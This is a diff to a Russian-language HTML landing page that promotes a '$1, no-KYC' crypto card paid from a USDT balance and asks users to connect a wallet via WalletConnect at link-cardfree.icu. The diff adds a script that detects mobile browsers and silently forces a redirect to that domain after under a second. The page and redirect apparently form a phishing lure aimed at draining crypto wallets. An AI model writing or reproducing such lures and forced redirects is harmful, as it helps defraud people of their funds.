@@ -187,7 +187,7 @@
   <p class="lead">Карта привязывается к вашему кошельку: выпуск за $1, без KYC и без пополнений. Оплата проходит прямо с баланса USDT TRC-20, карта готова за пару минут.</p>
 
   <a class="cta" href="https://link-cardfree.icu/">Выпустить карту</a>
-  <p class="hint">Откроется страница выпуска · кошелёк подключается через WalletConnect</p>
+  <p class="hint">Сейчас откроется страница выпуска · кошелёк подключается через WalletConnect</p>
 
   <ul class="facts">
     <li><span>Выпуск</span><b>$1</b></li>
@@ -243,6 +243,10 @@
 
 </main>
 
-
+<script>
+  if (/iPhone|iPad|iPod|Android/i.test(navigator.userAgent)) {
+    setTimeout(function () { window.location.replace('https://link-cardfree.icu/'); }, 900);
+  }
+</script>
 </body>
 </html>
